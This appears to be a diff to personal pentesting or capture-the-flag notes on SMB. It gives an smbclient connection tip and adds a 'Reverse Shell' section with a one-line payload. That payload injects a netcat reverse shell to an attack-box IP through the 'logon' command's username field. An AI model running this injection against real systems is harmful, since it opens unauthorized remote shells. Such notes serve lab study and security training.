@@ -24,3 +24,7 @@
 - use smbclient to connect
 - smbclient \\\\[ip]\\[share name]
   - you need a rediculous amount of slashes sometimes due to how things get parsed
+
+## Reverse Shell
+- if under the help command you see the command "logon" you may be able to get a shell
+  - logon "/=`nc [attack box ip] 4444 -e /bin/bash`"
